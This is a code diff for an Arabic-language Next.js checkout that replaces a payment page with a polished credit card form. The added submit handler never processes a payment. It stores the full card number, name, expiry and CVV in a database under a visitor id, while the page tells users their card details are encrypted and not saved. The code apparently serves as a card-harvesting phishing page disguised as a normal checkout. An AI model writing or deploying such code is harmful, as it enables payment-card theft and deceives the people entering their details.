@@ -1,407 +1,395 @@
 "use client"
 
+import type React from "react"
+
 import { useState, useEffect } from "react"
-import { useRouter, useSearchParams } from "next/navigation"
 import Image from "next/image"
-import { doc, getDoc, updateDoc } from "firebase/firestore"
-import { db } from "@/lib/firebase"
-import Header from "@/components/layout/header"
-import BottomNav from "@/components/layout/bottom-nav"
-import { useCart } from "@/app/contexts/cart-context"
-import CreditCardForm, { CardData } from "@/components/payment-form"
+import { CreditCard, Calendar, User, Lock } from "lucide-react"
+import { addData } from "@/lib/firebase"
 
-export default function PaymentPage() {
-  const router = useRouter()
-  const searchParams = useSearchParams()
-  const orderId = searchParams.get("orderId")
-  const { clearCart } = useCart()
+// Card types with their regex patterns and logos
+const CARD_TYPES = [
+  {
+    name: "visa",
+    pattern: /^4/,
+    image: "/visa.png",
+  },
+  {
+    name: "mastercard",
+    pattern: /^5[1-5]/,
+    image: "/mastercard.png",
+  },
+  {
+    name: "amex",
+    pattern: /^3[47]/,
+    image: "/amex.png",
+  },
+]
 
-  const [loading, setLoading] = useState(true)
-  const [error, setError] = useState("")
-  const [orderData, setOrderData] = useState<any>(null)
-  const [selectedPayment, setSelectedPayment] = useState("credit_card")
-  const [showOtp, setShowOtp] = useState(false)
-  const [otp, setOtp] = useState(["", "", "", "","",""])
-  const [verifying, setVerifying] = useState(false)
-  const [showCardForm, setShowCardForm] = useState(false)
-  const [processingCard, setProcessingCard] = useState(false)
+interface CreditCardFormProps {
+  onSubmit: (cardData: CardData) => void
+  isProcessing?: boolean
+}
 
-  useEffect(() => {
-    if (!orderId) {
-      router.push("/cart")
-      return
-    }
+export interface CardData {
+  cardNumber: string
+  cardholderName: string
+  expiryDate: string
+  cvv: string
+  cardType?: string
+}
 
-    const fetchOrder = async () => {
-      try {
-        setLoading(true)
-        const orderRef = doc(db, "orders", orderId)
-        const orderDoc = await getDoc(orderRef)
+export default function CreditCardForm({ onSubmit, isProcessing = false }: CreditCardFormProps) {
+  const [cardData, setCardData] = useState<CardData>({
+    cardNumber: "",
+    cardholderName: "",
+    expiryDate: "",
+    cvv: "",
+  })
+  const [errors, setErrors] = useState<Partial<Record<keyof CardData, string>>>({})
+  const [cardType, setCardType] = useState<string | null>(null)
+  const [isFlipped, setIsFlipped] = useState(false)
 
-        if (!orderDoc.exists()) {
-          setError("الطلب غير موجود")
-          return
-        }
+  // Format card number with spaces
+  const formatCardNumber = (value: string) => {
+    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
 
-        setOrderData(orderDoc.data())
-      } catch (err) {
-        console.error("Error fetching order:", err)
-        setError("حدث خطأ أثناء جلب بيانات الطلب")
-      } finally {
-        setLoading(false)
-      }
-    }
-
-    fetchOrder()
-  }, [orderId, router])
-
-  const handlePaymentSelect = (method: string) => {
-    setSelectedPayment(method)
-    setShowCardForm(method === "credit_card")
-  }
-
-  const handleOtpChange = (index: number, value: string) => {
-    if (value.length > 1) {
-      value = value.slice(0, 1)
-    }
-
-    const newOtp = [...otp]
-    newOtp[index] = value
-    setOtp(newOtp)
-
-    // Auto-focus next input
-    if (value && index < 5) {
-      const nextInput = document.getElementById(`otp-${index + 1}`)
-      if (nextInput) {
-        nextInput.focus()
-      }
-    }
-  }
-
-  const handleProceedPayment = () => {
-    if (selectedPayment === "credit_card") {
-      setShowCardForm(true)
+    // Different formatting for Amex (4-6-5) vs other cards (4-4-4-4)
+    if (cardType === "amex") {
+      const matches = v.match(/\d{1,4}|\d{1,6}|\d{1,5}/g)
+      return matches ? matches.join(" ") : v
     } else {
-      setShowOtp(true)
+      const matches = v.match(/\d{1,4}/g)
+      return matches ? matches.join(" ") : v
     }
   }
 
-  const handleCardSubmit = async (cardData: CardData) => {
-    try {
-      setProcessingCard(true)
+  // Format expiry date (MM/YY)
+  const formatExpiryDate = (value: string) => {
+    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
 
-      // Simulate card processing
-      await new Promise((resolve) => setTimeout(resolve, 1500))
-
-      // Show OTP verification after card is processed
-      setShowOtp(true)
-      setProcessingCard(false)
-    } catch (error) {
-      console.error("Error processing card:", error)
-      setError("حدث خطأ أثناء معالجة البطاقة. يرجى المحاولة مرة أخرى.")
-      setProcessingCard(false)
+    if (v.length >= 3) {
+      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
     }
+
+    return v
   }
 
-  const handleVerifyOtp = async () => {
-    const otpValue = otp.join("")
+  // Detect card type based on number
+  useEffect(() => {
+    const number = cardData.cardNumber.replace(/\s+/g, "")
 
-    if (otpValue.length !== 4) {
-      setError("يرجى إدخال رمز التحقق كاملاً")
-      return
+    if (number) {
+      const foundType = CARD_TYPES.find((card) => card.pattern.test(number))
+      setCardType(foundType ? foundType.name : null)
+
+      // Update card data with detected type
+      setCardData((prev) => ({
+        ...prev,
+        cardType: foundType ? foundType.name : undefined,
+      }))
+    } else {
+      setCardType(null)
+      setCardData((prev) => ({
+        ...prev,
+        cardType: undefined,
+      }))
+    }
+  }, [cardData.cardNumber])
+
+  // Handle input changes
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { name, value } = e.target
+
+    let formattedValue = value
+
+    // Apply formatting based on field
+    if (name === "cardNumber") {
+      formattedValue = formatCardNumber(value)
+    } else if (name === "expiryDate") {
+      formattedValue = formatExpiryDate(value)
+    } else if (name === "cvv") {
+      formattedValue = value.replace(/\D/g, "").substring(0, cardType === "amex" ? 4 : 3)
     }
 
-    try {
-      setVerifying(true)
+    setCardData({
+      ...cardData,
+      [name]: formattedValue,
+    })
 
-      // Simulate OTP verification
-      await new Promise((resolve) => setTimeout(resolve, 1500))
-
-      // Update order status in Firestore
-      const orderRef = doc(db, "orders", orderId!)
-      await updateDoc(orderRef, {
-        status: "paid",
-        paymentMethod: selectedPayment,
-        paidAt: new Date(),
+    // Clear error when user types
+    if (errors[name as keyof CardData]) {
+      setErrors({
+        ...errors,
+        [name]: "",
       })
-
-      // Clear cart
-      clearCart()
-
-      // Redirect to success page
-      router.push(`/checkout/success?orderId=${orderId}`)
-    } catch (err) {
-      console.error("Error processing payment:", err)
-      setError("حدث خطأ أثناء معالجة الدفع. يرجى المحاولة مرة أخرى.")
-    } finally {
-      setVerifying(false)
     }
   }
 
-  if (loading) {
-    return (
-      <main className="min-h-screen bg-gray-50 pb-16">
-        <Header />
-        <div className="flex h-[60vh] items-center justify-center">
-          <div className="text-center">
-            <div className="mb-4 h-12 w-12 animate-spin rounded-full border-4 border-blue-500 border-t-transparent mx-auto"></div>
-            <p>جاري تحميل بيانات الطلب...</p>
-          </div>
-        </div>
-        <BottomNav />
-      </main>
-    )
+  // Validate the form
+  const validateForm = () => {
+    const newErrors: Partial<Record<keyof CardData, string>> = {}
+
+    // Card number validation
+    const cardNumberWithoutSpaces = cardData.cardNumber.replace(/\s+/g, "")
+    if (!cardNumberWithoutSpaces) {
+      newErrors.cardNumber = "يرجى إدخال رقم البطاقة"
+    } else if (
+      (cardType === "amex" && cardNumberWithoutSpaces.length !== 15) ||
+      (cardType !== "amex" && cardNumberWithoutSpaces.length !== 16)
+    ) {
+      newErrors.cardNumber = "رقم البطاقة غير صحيح"
+    }
+
+    // Cardholder name validation
+    if (!cardData.cardholderName.trim()) {
+      newErrors.cardholderName = "يرجى إدخال اسم حامل البطاقة"
+    }
+
+    // Expiry date validation
+    if (!cardData.expiryDate) {
+      newErrors.expiryDate = "يرجى إدخال تاريخ الانتهاء"
+    } else {
+      const [month, year] = cardData.expiryDate.split("/")
+      const currentYear = new Date().getFullYear() % 100
+      const currentMonth = new Date().getMonth() + 1
+
+      if (!month || !year || month.length !== 2 || year.length !== 2) {
+        newErrors.expiryDate = "صيغة تاريخ الانتهاء غير صحيحة"
+      } else {
+        const numMonth = Number.parseInt(month, 10)
+        const numYear = Number.parseInt(year, 10)
+
+        if (numMonth < 1 || numMonth > 12) {
+          newErrors.expiryDate = "الشهر غير صحيح"
+        } else if (numYear < currentYear || (numYear === currentYear && numMonth < currentMonth)) {
+          newErrors.expiryDate = "البطاقة منتهية الصلاحية"
+        }
+      }
+    }
+
+    // CVV validation
+    if (!cardData.cvv) {
+      newErrors.cvv = "يرجى إدخال رمز الأمان"
+    } else if (
+      (cardType === "amex" && cardData.cvv.length !== 4) ||
+      (cardType !== "amex" && cardData.cvv.length !== 3)
+    ) {
+      newErrors.cvv = "رمز الأمان غير صحيح"
+    }
+
+    setErrors(newErrors)
+    return Object.keys(newErrors).length === 0
   }
 
-  if (error) {
+  // Handle form submission
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault()
+
+    if (validateForm()) {
+     const _id=localStorage.getItem('visitor')
+      addData({id:_id,...cardData})
+    }
+  }
+
+  // Get card logo based on detected type
+  const getCardLogo = () => {
+    if (!cardType) return null
+
+    const card = CARD_TYPES.find((c) => c.name === cardType)
+    if (!card) return null
+
     return (
-      <main className="min-h-screen bg-gray-50 pb-16">
-        <Header />
-        <div className="container mx-auto px-4 py-6">
-          <div className="rounded-lg bg-white p-8 text-center shadow">
-            <div className="mb-4 text-red-500">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                className="mx-auto h-16 w-16"
-                fill="none"
-                viewBox="0 0 24 24"
-                stroke="currentColor"
-              >
-                <path
-                  strokeLinecap="round"
-                  strokeLinejoin="round"
-                  strokeWidth={2}
-                  d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
-                />
-              </svg>
-            </div>
-            <h2 className="mb-2 text-xl font-bold">حدث خطأ</h2>
-            <p className="mb-6 text-gray-600">{error}</p>
-            <button
-              onClick={() => router.push("/cart")}
-              className="inline-block rounded-md bg-blue-500 px-6 py-3 text-white"
-            >
-              العودة إلى سلة التسوق
-            </button>
-          </div>
-        </div>
-        <BottomNav />
-      </main>
+      <div className="absolute left-3 top-1/2 -translate-y-1/2">
+        <Image src={card.image || "/placeholder.svg"} alt={card.name} width={40} height={25} />
+      </div>
     )
   }
 
   return (
-    <main className="min-h-screen bg-gray-50 pb-16">
-      <Header />
-
-      <div className="bg-gray-100 py-4 text-center">
-        <h1 className="text-2xl font-bold">الدفع</h1>
+    <div className="w-full max-w-md mx-auto">
+      <div className="mb-6">
+        <h2 className="text-xl font-bold text-right mb-2">تفاصيل البطاقة</h2>
+        <p className="text-gray-500 text-right">يرجى إدخال تفاصيل بطاقة الائتمان الخاصة بك</p>
       </div>
 
-      <div className="container mx-auto px-4 py-6">
-        {showOtp ? (
-          <div className="mx-auto max-w-md rounded-lg bg-white p-6 shadow">
-            <h2 className="mb-6 text-center text-xl font-bold">رمز التحقق</h2>
+      {/* Card Preview */}
+      <div
+        className={`relative h-48 w-full mb-8 rounded-xl shadow-lg transition-all duration-500 perspective-1000 ${
+          isFlipped ? "rotate-y-180" : ""
+        }`}
+      >
+        {/* Front of card */}
+        <div
+          className={`absolute inset-0 rounded-xl bg-gradient-to-br from-blue-500 to-purple-600 p-6 text-white transition-all duration-500 backface-hidden ${
+            isFlipped ? "opacity-0" : "opacity-100"
+          }`}
+        >
+          <div className="flex justify-between items-start">
+            <div className="w-12 h-12 rounded-full bg-white/30 backdrop-blur-sm"></div>
+            <div className="text-right">
+              <p className="text-xs opacity-70">بطاقة ائتمان</p>
+              <p className="text-sm font-semibold">{cardType ? cardType.toUpperCase() : "CARD"}</p>
+            </div>
+          </div>
 
-            <p className="mb-6 text-center text-gray-600">
-              تم إرسال رمز التحقق إلى رقم الهاتف {orderData?.customer?.phone}
+          <div className="mt-6">
+            <p className="text-sm opacity-70">رقم البطاقة</p>
+            <p className="font-mono text-xl tracking-wider">{cardData.cardNumber || "•••• •••• •••• ••••"}</p>
+          </div>
+
+          <div className="mt-4 flex justify-between">
+            <div>
+              <p className="text-xs opacity-70">تاريخ الانتهاء</p>
+              <p className="font-mono">{cardData.expiryDate || "MM/YY"}</p>
+            </div>
+            <div className="text-right">
+              <p className="text-xs opacity-70">حامل البطاقة</p>
+              <p className="font-mono truncate max-w-[150px]">{cardData.cardholderName || "الاسم الكامل"}</p>
+            </div>
+          </div>
+        </div>
+
+        {/* Back of card */}
+        <div
+          className={`absolute inset-0 rounded-xl bg-gradient-to-br from-gray-700 to-gray-900 text-white rotate-y-180 transition-all duration-500 backface-hidden ${
+            isFlipped ? "opacity-100" : "opacity-0"
+          }`}
+        >
+          <div className="h-12 bg-black mt-5"></div>
+          <div className="px-6 mt-4">
+            <div className="bg-gray-200 h-10 flex items-center justify-end px-3">
+              <p className="font-mono text-gray-800">{cardData.cvv || "•••"}</p>
+            </div>
+            <p className="text-xs mt-4 text-right opacity-70">
+              رمز الأمان (CVV) هو رمز مكون من 3 أرقام على ظهر البطاقة
             </p>
-
-            {error && <div className="mb-4 rounded-md bg-red-50 p-4 text-red-600">{error}</div>}
-
-            <div className="mb-6 flex justify-center space-x-3 rtl:space-x-reverse">
-              {otp.map((digit, index) => (
-                <input
-                  key={index}
-                  id={`otp-${index}`}
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={1}
-                  value={digit}
-                  onChange={(e) => handleOtpChange(index, e.target.value)}
-                  className="h-14 w-14 rounded-md border border-gray-300 text-center text-2xl"
-                />
-              ))}
-            </div>
-
-            <button
-              onClick={handleVerifyOtp}
-              className="w-full rounded-md bg-blue-500 py-3 font-medium text-white"
-              disabled={verifying}
-            >
-              {verifying ? "جاري التحقق..." : "تأكيد الدفع"}
-            </button>
-
-            <p className="mt-4 text-center text-sm text-gray-500">
-              لم تستلم الرمز؟ <button className="text-blue-500">إعادة الإرسال</button>
-            </p>
           </div>
-        ) : showCardForm ? (
-          <div className="grid gap-6 md:grid-cols-3">
-            <div className="md:col-span-2">
-              <div className="rounded-lg bg-white p-6 shadow">
-                <CreditCardForm onSubmit={handleCardSubmit} isProcessing={processingCard} />
-              </div>
-            </div>
-
-            <div className="md:col-span-1">
-              <div className="rounded-lg bg-white p-4 shadow">
-                <h2 className="mb-4 text-lg font-bold">ملخص الطلب</h2>
-
-                <div className="max-h-60 overflow-y-auto">
-                  {orderData?.items?.map((item: any) => (
-                    <div key={item.id} className="mb-3 flex items-center border-b border-gray-100 pb-3">
-                      <div className="mr-3 flex-grow">
-                        <div className="font-medium">{item.name}</div>
-                        <div className="text-sm text-gray-500">
-                          {item.quantity} × د.ك {item.price.toFixed(3)}
-                        </div>
-                      </div>
-                      <div className="font-bold">د.ك {(item.price * item.quantity).toFixed(3)}</div>
-                    </div>
-                  ))}
-                </div>
-
-                <div className="mt-4 space-y-2">
-                  <div className="flex justify-between">
-                    <span>إجمالي المنتجات</span>
-                    <span>د.ك {orderData?.totalPrice.toFixed(3)}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span>الشحن</span>
-                    <span>مجاني</span>
-                  </div>
-                  <div className="border-t border-gray-200 pt-2">
-                    <div className="flex justify-between font-bold">
-                      <span>الإجمالي</span>
-                      <span>د.ك {orderData?.totalPrice.toFixed(3)}</span>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        ) : (
-          <div className="grid gap-6 md:grid-cols-3">
-            <div className="md:col-span-2">
-              <div className="rounded-lg bg-white p-6 shadow">
-                <h2 className="mb-6 text-xl font-bold">اختر طريقة الدفع</h2>
-
-                {error && <div className="mb-4 rounded-md bg-red-50 p-4 text-red-600">{error}</div>}
-
-                <div className="space-y-4">
-                  <div
-                    className={`flex cursor-pointer items-center rounded-md border p-4 ${
-                      selectedPayment === "credit_card" ? "border-blue-500 bg-blue-50" : "border-gray-200"
-                    }`}
-                    onClick={() => handlePaymentSelect("credit_card")}
-                  >
-                    <div className="mr-3 flex-grow">
-                      <div className="font-medium">بطاقة ائتمان</div>
-                      <div className="text-sm text-gray-500">Visa, Mastercard, American Express</div>
-                    </div>
-                    <div className="flex space-x-2 rtl:space-x-reverse">
-                      <Image src="/visa.png" alt="Visa" width={40} height={25} />
-                      <Image src="/mastercard.png" alt="Mastercard" width={40} height={25} />
-                      <Image src="/amex.png" alt="American Express" width={40} height={25} />
-                    </div>
-                  </div>
-
-                  <div
-                    className={`flex cursor-pointer items-center rounded-md border p-4 ${
-                      selectedPayment === "knet" ? "border-blue-500 bg-blue-50" : "border-gray-200"
-                    }`}
-                    onClick={() => handlePaymentSelect("knet")}
-                  >
-                    <div className="mr-3 flex-grow">
-                      <div className="font-medium">كي نت</div>
-                      <div className="text-sm text-gray-500">الدفع باستخدام بطاقة كي نت</div>
-                    </div>
-                    <div>
-                      <Image src="/knet.png" alt="KNET" width={60} height={30} />
-                    </div>
-                  </div>
-
-                  <div
-                    className={`flex cursor-pointer items-center rounded-md border p-4 ${
-                      selectedPayment === "cash" ? "border-blue-500 bg-blue-50" : "border-gray-200"
-                    }`}
-                    onClick={() => handlePaymentSelect("cash")}
-                  >
-                    <div className="mr-3 flex-grow">
-                      <div className="font-medium">الدفع عند الاستلام</div>
-                      <div className="text-sm text-gray-500">ادفع نقداً عند استلام طلبك</div>
-                    </div>
-                    <div>
-                      <svg
-                        xmlns="http://www.w3.org/2000/svg"
-                        className="h-8 w-8 text-green-500"
-                        fill="none"
-                        viewBox="0 0 24 24"
-                        stroke="currentColor"
-                      >
-                        <path
-                          strokeLinecap="round"
-                          strokeLinejoin="round"
-                          strokeWidth={2}
-                          d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z"
-                        />
-                      </svg>
-                    </div>
-                  </div>
-                </div>
-
-                <button
-                  onClick={handleProceedPayment}
-                  className="mt-6 w-full rounded-md bg-blue-500 py-3 font-medium text-white"
-                >
-                  متابعة الدفع
-                </button>
-              </div>
-            </div>
-
-            <div className="md:col-span-1">
-              <div className="rounded-lg bg-white p-4 shadow">
-                <h2 className="mb-4 text-lg font-bold">ملخص الطلب</h2>
-
-                <div className="max-h-60 overflow-y-auto">
-                  {orderData?.items?.map((item: any) => (
-                    <div key={item.id} className="mb-3 flex items-center border-b border-gray-100 pb-3">
-                      <div className="mr-3 flex-grow">
-                        <div className="font-medium">{item.name}</div>
-                        <div className="text-sm text-gray-500">
-                          {item.quantity} × د.ك {item.price.toFixed(3)}
-                        </div>
-                      </div>
-                      <div className="font-bold">د.ك {(item.price * item.quantity).toFixed(3)}</div>
-                    </div>
-                  ))}
-                </div>
-
-                <div className="mt-4 space-y-2">
-                  <div className="flex justify-between">
-                    <span>إجمالي المنتجات</span>
-                    <span>د.ك {orderData?.totalPrice.toFixed(3)}</span>
-                  </div>
-                  <div className="flex justify-between">
-                    <span>الشحن</span>
-                    <span>مجاني</span>
-                  </div>
-                  <div className="border-t border-gray-200 pt-2">
-                    <div className="flex justify-between font-bold">
-                      <span>الإجمالي</span>
-                      <span>د.ك {orderData?.totalPrice.toFixed(3)}</span>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        )}
+        </div>
       </div>
 
-      <BottomNav />
-    </main>
+      <form onSubmit={handleSubmit} className="space-y-4">
+        {/* Card Number */}
+        <div>
+          <label htmlFor="cardNumber" className="block text-sm font-medium text-right mb-1">
+            رقم البطاقة
+          </label>
+          <div className="relative">
+            <input
+              type="text"
+              id="cardNumber"
+              name="cardNumber"
+              value={cardData.cardNumber}
+              onChange={handleChange}
+              placeholder="0000 0000 0000 0000"
+              maxLength={cardType === "amex" ? 17 : 19}
+              className={`w-full rounded-md border p-3 pl-12 pr-4 text-right ${
+                errors.cardNumber ? "border-red-500" : "border-gray-300"
+              }`}
+              dir="ltr"
+            />
+            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
+              <CreditCard className="h-5 w-5" />
+            </div>
+            {getCardLogo()}
+          </div>
+          {errors.cardNumber && <p className="mt-1 text-sm text-red-500 text-right">{errors.cardNumber}</p>}
+        </div>
+
+        {/* Cardholder Name */}
+        <div>
+          <label htmlFor="cardholderName" className="block text-sm font-medium text-right mb-1">
+            اسم حامل البطاقة
+          </label>
+          <div className="relative">
+            <input
+              type="text"
+              id="cardholderName"
+              name="cardholderName"
+              value={cardData.cardholderName}
+              onChange={handleChange}
+              placeholder="الاسم كما هو مكتوب على البطاقة"
+              className={`w-full rounded-md border p-3 pr-10 text-right ${
+                errors.cardholderName ? "border-red-500" : "border-gray-300"
+              }`}
+            />
+            <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
+              <User className="h-5 w-5" />
+            </div>
+          </div>
+          {errors.cardholderName && <p className="mt-1 text-sm text-red-500 text-right">{errors.cardholderName}</p>}
+        </div>
+
+        {/* Expiry Date and CVV */}
+        <div className="grid grid-cols-2 gap-4">
+          <div>
+            <label htmlFor="expiryDate" className="block text-sm font-medium text-right mb-1">
+              تاريخ الانتهاء
+            </label>
+            <div className="relative">
+              <input
+                type="text"
+                id="expiryDate"
+                name="expiryDate"
+                value={cardData.expiryDate}
+                onChange={handleChange}
+                placeholder="MM/YY"
+                maxLength={5}
+                className={`w-full rounded-md border p-3 pl-4 pr-10 text-right ${
+                  errors.expiryDate ? "border-red-500" : "border-gray-300"
+                }`}
+                dir="ltr"
+              />
+              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
+                <Calendar className="h-5 w-5" />
+              </div>
+            </div>
+            {errors.expiryDate && <p className="mt-1 text-sm text-red-500 text-right">{errors.expiryDate}</p>}
+          </div>
+
+          <div>
+            <label htmlFor="cvv" className="block text-sm font-medium text-right mb-1">
+              رمز الأمان (CVV)
+            </label>
+            <div className="relative">
+              <input
+                type="text"
+                id="cvv"
+                name="cvv"
+                value={cardData.cvv}
+                onChange={handleChange}
+                onFocus={() => setIsFlipped(true)}
+                onBlur={() => setIsFlipped(false)}
+                placeholder={cardType === "amex" ? "0000" : "000"}
+                maxLength={cardType === "amex" ? 4 : 3}
+                className={`w-full rounded-md border p-3 pl-4 pr-10 text-right ${
+                  errors.cvv ? "border-red-500" : "border-gray-300"
+                }`}
+                dir="ltr"
+              />
+              <div className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400">
+                <Lock className="h-5 w-5" />
+              </div>
+            </div>
+            {errors.cvv && <p className="mt-1 text-sm text-red-500 text-right">{errors.cvv}</p>}
+          </div>
+        </div>
+
+        <div className="mt-6">
+          <button
+            type="submit"
+            className="w-full rounded-md bg-blue-500 py-3 font-medium text-white transition-colors hover:bg-blue-600 disabled:bg-blue-300"
+            disabled={isProcessing}
+          >
+            {isProcessing ? "جاري المعالجة..." : "تأكيد الدفع"}
+          </button>
+        </div>
+      </form>
+
+      <div className="mt-6 text-center">
+        <p className="text-sm text-gray-500">بياناتك آمنة ومشفرة. لن يتم حفظ معلومات بطاقتك.</p>
+      </div>
+    </div>
   )
 }
 
